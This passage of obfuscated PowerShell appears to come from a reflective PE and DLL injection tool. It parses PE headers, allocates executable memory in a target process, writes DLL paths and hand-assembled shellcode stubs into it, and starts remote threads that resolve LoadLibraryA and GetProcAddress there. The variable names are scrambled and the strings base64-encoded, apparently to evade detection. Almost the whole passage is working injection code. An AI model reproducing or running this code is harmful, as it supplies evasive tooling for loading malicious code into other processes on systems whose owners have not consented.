		${__/\___/===\/\/=\/} | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value (${__/==\____/=\/\/=}.IMAGE_NT_HEADERS)
		${__/\___/===\/\/=\/} | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value (${__/==\____/=\/\/=}.NtHeadersPtr)
		${__/\___/===\/\/=\/} | Add-Member -MemberType NoteProperty -Name PE64Bit -Value (${__/==\____/=\/\/=}.PE64Bit)
		${__/\___/===\/\/=\/} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBtAGEAZwBlAA=='))) -Value (${__/==\____/=\/\/=}.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		if (${__/\___/===\/\/=\/}.PE64Bit -eq $true)
		{
			[IntPtr]${____/==\_/=\_/\/\} = [IntPtr](__/\______/=\___/\ ([Int64]${__/\___/===\/\/=\/}.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
			${__/\___/===\/\/=\/} | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value ${____/==\_/=\_/\/\}
		}
		else
		{
			[IntPtr]${____/==\_/=\_/\/\} = [IntPtr](__/\______/=\___/\ ([Int64]${__/\___/===\/\/=\/}.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
			${__/\___/===\/\/=\/} | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value ${____/==\_/=\_/\/\}
		}
		if ((${__/==\____/=\/\/=}.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Const.IMAGE_FILE_DLL) -eq $Win32Const.IMAGE_FILE_DLL)
		{
			${__/\___/===\/\/=\/} | Add-Member -MemberType NoteProperty -Name FileType -Value $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABMAEwA')))
		}
		elseif ((${__/==\____/=\/\/=}.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Const.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Const.IMAGE_FILE_EXECUTABLE_IMAGE)
		{
			${__/\___/===\/\/=\/} | Add-Member -MemberType NoteProperty -Name FileType -Value $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUA')))
		}
		else
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAZgBpAGwAZQAgAGkAcwAgAG4AbwB0ACAAYQBuACAARQBYAEUAIABvAHIAIABEAEwATAA=')))
		}
		return ${__/\___/===\/\/=\/}
	}
	Function _/==\/\_/=\/=\__/\
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		${__/\_/\__/=\/=\_/\},
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		${_/=\/==\/=\____/=\}
		)
		${____/\__/\_/==\/=} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		${/=\_____/\_/\/\/=} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${_/=\/==\/=\____/=\})
		${_/==\__/\/\/\__/=} = [UIntPtr][UInt64]([UInt64]${/=\_____/\_/\/\/=}.Length + 1)
		${_/\/===\_/==\_/=\} = $Win32Func.VirtualAllocEx.Invoke(${__/\_/\__/=\/=\_/\}, [IntPtr]::Zero, ${_/==\__/\/\/\__/=}, $Win32Const.MEM_COMMIT -bor $Win32Const.MEM_RESERVE, $Win32Const.PAGE_READWRITE)
		if (${_/\/===\_/==\_/=\} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAA==')))
		}
		[UIntPtr]${_/=\/===\_/==\__/} = [UIntPtr]::Zero
		${__/=====\__/\__/\} = $Win32Func.WriteProcessMemory.Invoke(${__/\_/\__/=\/=\_/\}, ${_/\/===\_/==\_/=\}, ${_/=\/==\/=\____/=\}, ${_/==\__/\/\/\__/=}, [Ref]${_/=\/===\_/==\__/})
		if (${__/=====\__/\__/\} -eq $false)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABEAEwATAAgAHAAYQB0AGgAIAB0AG8AIAByAGUAbQBvAHQAZQAgAHAAcgBvAGMAZQBzAHMAIABtAGUAbQBvAHIAeQA=')))
		}
		if (${_/==\__/\/\/\__/=} -ne ${_/=\/===\_/==\__/})
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGQAbgAnAHQAIAB3AHIAaQB0AGUAIAB0AGgAZQAgAGUAeABwAGUAYwB0AGUAZAAgAGEAbQBvAHUAbgB0ACAAbwBmACAAYgB5AHQAZQBzACAAdwBoAGUAbgAgAHcAcgBpAHQAaQBuAGcAIABhACAARABMAEwAIABwAGEAdABoACAAdABvACAAbABvAGEAZAAgAHQAbwAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAA==')))
		}
		${_/\/=\/\/\/===\/\} = $Win32Func.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awBlAHIAbgBlAGwAMwAyAC4AZABsAGwA'))))
		${/==\/\/====\__/\_} = $Win32Func.GetProcAddr.Invoke(${_/\/=\/\/\/===\/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABMAGkAYgByAGEAcgB5AEEA')))) 
		[IntPtr]${_/\/=\__/\_/\/\/\} = [IntPtr]::Zero
		if (${__/\___/===\/\/=\/}.PE64Bit -eq $true)
		{
			${/===\/==\/=\/==\/} = $Win32Func.VirtualAllocEx.Invoke(${__/\_/\__/=\/=\_/\}, [IntPtr]::Zero, ${_/==\__/\/\/\__/=}, $Win32Const.MEM_COMMIT -bor $Win32Const.MEM_RESERVE, $Win32Const.PAGE_READWRITE)
			if (${/===\/==\/=\/==\/} -eq [IntPtr]::Zero)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIAB0AGgAZQAgAHIAZQB0AHUAcgBuACAAdgBhAGwAdQBlACAAbwBmACAATABvAGEAZABMAGkAYgByAGEAcgB5AEEA')))
			}
			${_/\_/===\/=\/\/=\} = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			${__/\__/\/\/=\__/=} = @(0x48, 0xba)
			${_/=\____/\_/\_/==} = @(0xff, 0xd2, 0x48, 0xba)
			${/==\/==\____/\/\/} = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			${__/=\_/===\___/=\} = ${_/\_/===\/=\/\/=\}.Length + ${__/\__/\/\/=\__/=}.Length + ${_/=\____/\_/\_/==}.Length + ${/==\/==\____/\/\/}.Length + (${____/\__/\_/==\/=} * 3)
			${/==\_____/=\___/=} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${__/=\_/===\___/=\})
			${__/==\/==\/\/====} = ${/==\_____/=\___/=}
			___/===\_/\/=\__/\ -_/====\____/\___/\ ${_/\_/===\/=\/\/=\} -____/\/====\__/==\ ${/==\_____/=\___/=}
			${/==\_____/=\___/=} = __/\______/=\___/\ ${/==\_____/=\___/=} (${_/\_/===\/=\/\/=\}.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr(${_/\/===\_/==\_/=\}, ${/==\_____/=\___/=}, $false)
			${/==\_____/=\___/=} = __/\______/=\___/\ ${/==\_____/=\___/=} (${____/\__/\_/==\/=})
			___/===\_/\/=\__/\ -_/====\____/\___/\ ${__/\__/\/\/=\__/=} -____/\/====\__/==\ ${/==\_____/=\___/=}
			${/==\_____/=\___/=} = __/\______/=\___/\ ${/==\_____/=\___/=} (${__/\__/\/\/=\__/=}.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr(${/==\/\/====\__/\_}, ${/==\_____/=\___/=}, $false)
			${/==\_____/=\___/=} = __/\______/=\___/\ ${/==\_____/=\___/=} (${____/\__/\_/==\/=})
			___/===\_/\/=\__/\ -_/====\____/\___/\ ${_/=\____/\_/\_/==} -____/\/====\__/==\ ${/==\_____/=\___/=}
			${/==\_____/=\___/=} = __/\______/=\___/\ ${/==\_____/=\___/=} (${_/=\____/\_/\_/==}.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr(${/===\/==\/=\/==\/}, ${/==\_____/=\___/=}, $false)
			${/==\_____/=\___/=} = __/\______/=\___/\ ${/==\_____/=\___/=} (${____/\__/\_/==\/=})
			___/===\_/\/=\__/\ -_/====\____/\___/\ ${/==\/==\____/\/\/} -____/\/====\__/==\ ${/==\_____/=\___/=}
			${/==\_____/=\___/=} = __/\______/=\___/\ ${/==\_____/=\___/=} (${/==\/==\____/\/\/}.Length)
			${__/==\/\/\/\/=\_/} = $Win32Func.VirtualAllocEx.Invoke(${__/\_/\__/=\/=\_/\}, [IntPtr]::Zero, [UIntPtr][UInt64]${__/=\_/===\___/=\}, $Win32Const.MEM_COMMIT -bor $Win32Const.MEM_RESERVE, $Win32Const.PAGE_EXECUTE_READWRITE)
			if (${__/==\/\/\/\/=\_/} -eq [IntPtr]::Zero)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIABzAGgAZQBsAGwAYwBvAGQAZQA=')))
			}
			${__/=====\__/\__/\} = $Win32Func.WriteProcessMemory.Invoke(${__/\_/\__/=\/=\_/\}, ${__/==\/\/\/\/=\_/}, ${__/==\/==\/\/====}, [UIntPtr][UInt64]${__/=\_/===\___/=\}, [Ref]${_/=\/===\_/==\__/})
			if ((${__/=====\__/\__/\} -eq $false) -or ([UInt64]${_/=\/===\_/==\__/} -ne [UInt64]${__/=\_/===\___/=\}))
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABzAGgAZQBsAGwAYwBvAGQAZQAgAHQAbwAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAG0AZQBtAG8AcgB5AC4A')))
			}
			${_/====\/\_/\_/===} = ____/\_/\_/\__/\__ -__/==\_/\__/\_/=\_ ${__/\_/\__/=\/=\_/\} -__/\/==\_/\_/\_/=\ ${__/==\/\/\/\/=\_/} -Win32Func $Win32Func
			${__/=\/==\____/\/\} = $Win32Func.WaitForSingleObject.Invoke(${_/====\/\_/\_/===}, 20000)
			if (${__/=\/==\____/\/\} -ne 0)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEMAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkACAAdABvACAAYwBhAGwAbAAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgAgAGYAYQBpAGwAZQBkAC4A')))
			}
			[IntPtr]${__/=\/=\_/\_/=\/=} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${____/\__/\_/==\/=})
			${__/=\/==\____/\/\} = $Win32Func.ReadProcessMemory.Invoke(${__/\_/\__/=\/=\_/\}, ${/===\/==\/=\/==\/}, ${__/=\/=\_/\_/=\/=}, [UIntPtr][UInt64]${____/\__/\_/==\/=}, [Ref]${_/=\/===\_/==\__/})
			if (${__/=\/==\____/\/\} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFIAZQBhAGQAUAByAG8AYwBlAHMAcwBNAGUAbQBvAHIAeQAgAGYAYQBpAGwAZQBkAA==')))
			}
			[IntPtr]${_/\/=\__/\_/\/\/\} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${__/=\/=\_/\_/=\/=}, [Type][IntPtr])
			$Win32Func.VirtualFreeEx.Invoke(${__/\_/\__/=\/=\_/\}, ${/===\/==\/=\/==\/}, [UIntPtr][UInt64]0, $Win32Const.MEM_RELEASE) | Out-Null
			$Win32Func.VirtualFreeEx.Invoke(${__/\_/\__/=\/=\_/\}, ${__/==\/\/\/\/=\_/}, [UIntPtr][UInt64]0, $Win32Const.MEM_RELEASE) | Out-Null
		}
		else
		{
			[IntPtr]${_/====\/\_/\_/===} = ____/\_/\_/\__/\__ -__/==\_/\__/\_/=\_ ${__/\_/\__/=\/=\_/\} -__/\/==\_/\_/\_/=\ ${/==\/\/====\__/\_} -__/========\/\/\__ ${_/\/===\_/==\_/=\} -Win32Func $Win32Func
			${__/=\/==\____/\/\} = $Win32Func.WaitForSingleObject.Invoke(${_/====\/\_/\_/===}, 20000)
			if (${__/=\/==\____/\/\} -ne 0)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEMAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkACAAdABvACAAYwBhAGwAbAAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgAgAGYAYQBpAGwAZQBkAC4A')))
			}
			[Int32]${/=\/\/\/====\/\/\} = 0
			${__/=\/==\____/\/\} = $Win32Func.GetExitCodeThread.Invoke(${_/====\/\_/\_/===}, [Ref]${/=\/\/\/====\/\/\})
			if ((${__/=\/==\____/\/\} -eq 0) -or (${/=\/\/\/====\/\/\} -eq 0))
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEcAZQB0AEUAeABpAHQAQwBvAGQAZQBUAGgAcgBlAGEAZAAgAGYAYQBpAGwAZQBkAA==')))
			}
			[IntPtr]${_/\/=\__/\_/\/\/\} = [IntPtr]${/=\/\/\/====\/\/\}
		}
		$Win32Func.VirtualFreeEx.Invoke(${__/\_/\__/=\/=\_/\}, ${_/\/===\_/==\_/=\}, [UIntPtr][UInt64]0, $Win32Const.MEM_RELEASE) | Out-Null
		return ${_/\/=\__/\_/\/\/\}
	}
	Function __/\/=\/=\/\/\/\__
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		${__/\_/\__/=\/=\_/\},
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		${_/\______/\/\_/\/\},
		[Parameter(Position=2, Mandatory=$true)]
		[String]
		${_____/=\/=\/\___/=}
		)
		${____/\__/\_/==\/=} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		${____/=\/=====\__/} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi(${_____/=\/=\/\___/=})
		${/=\/======\/=\__/} = [UIntPtr][UInt64]([UInt64]${_____/=\/=\/\___/=}.Length + 1)
		${___/=\/=\/\___/\/} = $Win32Func.VirtualAllocEx.Invoke(${__/\_/\__/=\/=\_/\}, [IntPtr]::Zero, ${/=\/======\/=\__/}, $Win32Const.MEM_COMMIT -bor $Win32Const.MEM_RESERVE, $Win32Const.PAGE_READWRITE)
		if (${___/=\/=\/\___/\/} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAA==')))
		}
		[UIntPtr]${_/=\/===\_/==\__/} = [UIntPtr]::Zero
		${__/=====\__/\__/\} = $Win32Func.WriteProcessMemory.Invoke(${__/\_/\__/=\/=\_/\}, ${___/=\/=\/\___/\/}, ${____/=\/=====\__/}, ${/=\/======\/=\__/}, [Ref]${_/=\/===\_/==\__/})
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal(${____/=\/=====\__/})
		if (${__/=====\__/\__/\} -eq $false)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABEAEwATAAgAHAAYQB0AGgAIAB0AG8AIAByAGUAbQBvAHQAZQAgAHAAcgBvAGMAZQBzAHMAIABtAGUAbQBvAHIAeQA=')))
		}
		if (${/=\/======\/=\__/} -ne ${_/=\/===\_/==\__/})
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGQAbgAnAHQAIAB3AHIAaQB0AGUAIAB0AGgAZQAgAGUAeABwAGUAYwB0AGUAZAAgAGEAbQBvAHUAbgB0ACAAbwBmACAAYgB5AHQAZQBzACAAdwBoAGUAbgAgAHcAcgBpAHQAaQBuAGcAIABhACAARABMAEwAIABwAGEAdABoACAAdABvACAAbABvAGEAZAAgAHQAbwAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAA==')))
		}
		${_/\/=\/\/\/===\/\} = $Win32Func.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awBlAHIAbgBlAGwAMwAyAC4AZABsAGwA'))))
		${_/=\/\/\/\/\_/\/=} = $Win32Func.GetProcAddr.Invoke(${_/\/=\/\/\/===\/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUAByAG8AYwBBAGQAZAByAA==')))) 
		${/======\_/\/====\} = $Win32Func.VirtualAllocEx.Invoke(${__/\_/\__/=\/=\_/\}, [IntPtr]::Zero, [UInt64][UInt64]${____/\__/\_/==\/=}, $Win32Const.MEM_COMMIT -bor $Win32Const.MEM_RESERVE, $Win32Const.PAGE_READWRITE)
		if (${/======\_/\/====\} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIAB0AGgAZQAgAHIAZQB0AHUAcgBuACAAdgBhAGwAdQBlACAAbwBmACAARwBlAHQAUAByAG8AYwBBAGQAZAByAA==')))
		}
		[Byte[]]${___/=======\_/==\} = @()
		if (${__/\___/===\/\/=\/}.PE64Bit -eq $true)
		{
			${/===\/\/\_/\/\_/\} = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			${_/\/\_/=\_/=====\} = @(0x48, 0xba)
			${/==\__/\/\_/==\/=} = @(0x48, 0xb8)
			${_/=\_/\____/\/==\} = @(0xff, 0xd0, 0x48, 0xb9)
			${_/=\_/\/\/==\_/=\} = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			${/===\/\/\_/\/\_/\} = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			${_/\/\_/=\_/=====\} = @(0xb9)
			${/==\__/\/\_/==\/=} = @(0x51, 0x50, 0xb8)
			${_/=\_/\____/\/==\} = @(0xff, 0xd0, 0xb9)
			${_/=\_/\/\/==\_/=\} = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		${__/=\_/===\___/=\} = ${/===\/\/\_/\/\_/\}.Length + ${_/\/\_/=\_/=====\}.Length + ${/==\__/\/\_/==\/=}.Length + ${_/=\_/\____/\/==\}.Length + ${_/=\_/\/\/==\_/=\}.Length + (${____/\__/\_/==\/=} * 4)
		${/==\_____/=\___/=} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${__/=\_/===\___/=\})
		${__/==\/==\/\/====} = ${/==\_____/=\___/=}
		___/===\_/\/=\__/\ -_/====\____/\___/\ ${/===\/\/\_/\/\_/\} -____/\/====\__/==\ ${/==\_____/=\___/=}
		${/==\_____/=\___/=} = __/\______/=\___/\ ${/==\_____/=\___/=} (${/===\/\/\_/\/\_/\}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${_/\______/\/\_/\/\}, ${/==\_____/=\___/=}, $false)
		${/==\_____/=\___/=} = __/\______/=\___/\ ${/==\_____/=\___/=} (${____/\__/\_/==\/=})
		___/===\_/\/=\__/\ -_/====\____/\___/\ ${_/\/\_/=\_/=====\} -____/\/====\__/==\ ${/==\_____/=\___/=}
		${/==\_____/=\___/=} = __/\______/=\___/\ ${/==\_____/=\___/=} (${_/\/\_/=\_/=====\}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${___/=\/=\/\___/\/}, ${/==\_____/=\___/=}, $false)
		${/==\_____/=\___/=} = __/\______/=\___/\ ${/==\_____/=\___/=} (${____/\__/\_/==\/=})
		___/===\_/\/=\__/\ -_/====\____/\___/\ ${/==\__/\/\_/==\/=} -____/\/====\__/==\ ${/==\_____/=\___/=}
		${/==\_____/=\___/=} = __/\______/=\___/\ ${/==\_____/=\___/=} (${/==\__/\/\_/==\/=}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${_/=\/\/\/\/\_/\/=}, ${/==\_____/=\___/=}, $false)
		${/==\_____/=\___/=} = __/\______/=\___/\ ${/==\_____/=\___/=} (${____/\__/\_/==\/=})
		___/===\_/\/=\__/\ -_/====\____/\___/\ ${_/=\_/\____/\/==\} -____/\/====\__/==\ ${/==\_____/=\___/=}
		${/==\_____/=\___/=} = __/\______/=\___/\ ${/==\_____/=\___/=} (${_/=\_/\____/\/==\}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${/======\_/\/====\}, ${/==\_____/=\___/=}, $false)
		${/==\_____/=\___/=} = __/\______/=\___/\ ${/==\_____/=\___/=} (${____/\__/\_/==\/=})
		___/===\_/\/=\__/\ -_/====\____/\___/\ ${_/=\_/\/\/==\_/=\} -____/\/====\__/==\ ${/==\_____/=\___/=}
		${/==\_____/=\___/=} = __/\______/=\___/\ ${/==\_____/=\___/=} (${_/=\_/\/\/==\_/=\}.Length)
		${__/==\/\/\/\/=\_/} = $Win32Func.VirtualAllocEx.Invoke(${__/\_/\__/=\/=\_/\}, [IntPtr]::Zero, [UIntPtr][UInt64]${__/=\_/===\___/=\}, $Win32Const.MEM_COMMIT -bor $Win32Const.MEM_RESERVE, $Win32Const.PAGE_EXECUTE_READWRITE)
		if (${__/==\/\/\/\/=\_/} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIABzAGgAZQBsAGwAYwBvAGQAZQA=')))
		}
		${__/=====\__/\__/\} = $Win32Func.WriteProcessMemory.Invoke(${__/\_/\__/=\/=\_/\}, ${__/==\/\/\/\/=\_/}, ${__/==\/==\/\/====}, [UIntPtr][UInt64]${__/=\_/===\___/=\}, [Ref]${_/=\/===\_/==\__/})
		if ((${__/=====\__/\__/\} -eq $false) -or ([UInt64]${_/=\/===\_/==\__/} -ne [UInt64]${__/=\_/===\___/=\}))
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABzAGgAZQBsAGwAYwBvAGQAZQAgAHQAbwAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAG0AZQBtAG8AcgB5AC4A')))
		}
		${_/====\/\_/\_/===} = ____/\_/\_/\__/\__ -__/==\_/\__/\_/=\_ ${__/\_/\__/=\/=\_/\} -__/\/==\_/\_/\_/=\ ${__/==\/\/\/\/=\_/} -Win32Func $Win32Func
		${__/=\/==\____/\/\} = $Win32Func.WaitForSingleObject.Invoke(${_/====\/\_/\_/===}, 20000)
		if (${__/=\/==\____/\/\} -ne 0)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEMAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkACAAdABvACAAYwBhAGwAbAAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgAgAGYAYQBpAGwAZQBkAC4A')))
		}
		[IntPtr]${__/=\/=\_/\_/=\/=} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${____/\__/\_/==\/=})
		${__/=\/==\____/\/\} = $Win32Func.ReadProcessMemory.Invoke(${__/\_/\__/=\/=\_/\}, ${/======\_/\/====\}, ${__/=\/=\_/\_/=\/=}, [UIntPtr][UInt64]${____/\__/\_/==\/=}, [Ref]${_/=\/===\_/==\__/})
		if ((${__/=\/==\____/\/\} -eq $false) -or (${_/=\/===\_/==\__/} -eq 0))
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFIAZQBhAGQAUAByAG8AYwBlAHMAcwBNAGUAbQBvAHIAeQAgAGYAYQBpAGwAZQBkAA==')))
		}
		[IntPtr]${__/\__/=\_/=\/=\/} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${__/=\/=\_/\_/=\/=}, [Type][IntPtr])
		$Win32Func.VirtualFreeEx.Invoke(${__/\_/\__/=\/=\_/\}, ${__/==\/\/\/\/=\_/}, [UIntPtr][UInt64]0, $Win32Const.MEM_RELEASE) | Out-Null
		$Win32Func.VirtualFreeEx.Invoke(${__/\_/\__/=\/=\_/\}, ${___/=\/=\/\___/\/}, [UIntPtr][UInt64]0, $Win32Const.MEM_RELEASE) | Out-Null
		$Win32Func.VirtualFreeEx.Invoke(${__/\_/\__/=\/=\_/\}, ${/======\_/\/====\}, [UIntPtr][UInt64]0, $Win32Const.MEM_RELEASE) | Out-Null
		return ${__/\__/=\_/=\/=\/}
	}
	Function __/===\_/\/=\_/\__
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		${_____/=\___/=\/\/=},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		${__/\___/===\/\/=\/},
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Func,
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		for( ${/=\__/=\/\_/=\__/} = 0; ${/=\__/=\/\_/=\__/} -lt ${__/\___/===\/\/=\/}.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; ${/=\__/=\/\_/=\__/}++)
		{
			[IntPtr]${____/==\_/=\_/\/\} = [IntPtr](__/\______/=\___/\ ([Int64]${__/\___/===\/\/=\/}.SectionHeaderPtr) (${/=\__/=\/\_/=\__/} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			${/=====\/\/=\__/=\} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${____/==\_/=\_/\/\}, [Type]$Win32Types.IMAGE_SECTION_HEADER)
			[IntPtr]${__/=\/===\/===\/=} = [IntPtr](__/\______/=\___/\ ([Int64]${__/\___/===\/\/=\/}.PEHandle) ([Int64]${/=====\/\/=\__/=\}.VirtualAddress))
			${_/=\/\/\/\/==\/=\} = ${/=====\/\/=\__/=\}.SizeOfRawData
			if (${/=====\/\/=\__/=\}.PointerToRawData -eq 0)
			{
				${_/=\/\/\/\/==\/=\} = 0
			}
			if (${_/=\/\/\/\/==\/=\} -gt ${/=====\/\/=\__/=\}.VirtualSize)
			{
				${_/=\/\/\/\/==\/=\} = ${/=====\/\/=\__/=\}.VirtualSize
			}
			if (${_/=\/\/\/\/==\/=\} -gt 0)
			{
				_/===\_/\/=\/=\_/\ -_/===\/=\/==\/===\ $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHAAeQAtAFMAZQBjAHQAaQBvAG4AcwA6ADoATQBhAHIAcwBoAGEAbABDAG8AcAB5AA=='))) -PEInfo ${__/\___/===\/\/=\/} -__/\/==\_/\_/\_/=\ ${__/=\/===\/===\/=} -__/\/=\____/==\/\/ ${_/=\/\/\/\/==\/=\} | Out-Null
				[System.Runtime.InteropServices.Marshal]::Copy(${_____/=\___/=\/\/=}, [Int32]${/=====\/\/=\__/=\}.PointerToRawData, ${__/=\/===\/===\/=}, ${_/=\/\/\/\/==\/=\})
			}
			if (${/=====\/\/=\__/=\}.SizeOfRawData -lt ${/=====\/\/=\__/=\}.VirtualSize)
			{
				${/===\/\/\_/\/\/==} = ${/=====\/\/=\__/=\}.VirtualSize - ${_/=\/\/\/\/==\/=\}
				[IntPtr]${__/\/==\_/\_/\_/=\} = [IntPtr](__/\______/=\___/\ ([Int64]${__/=\/===\/===\/=}) ([Int64]${_/=\/\/\/\/==\/=\}))
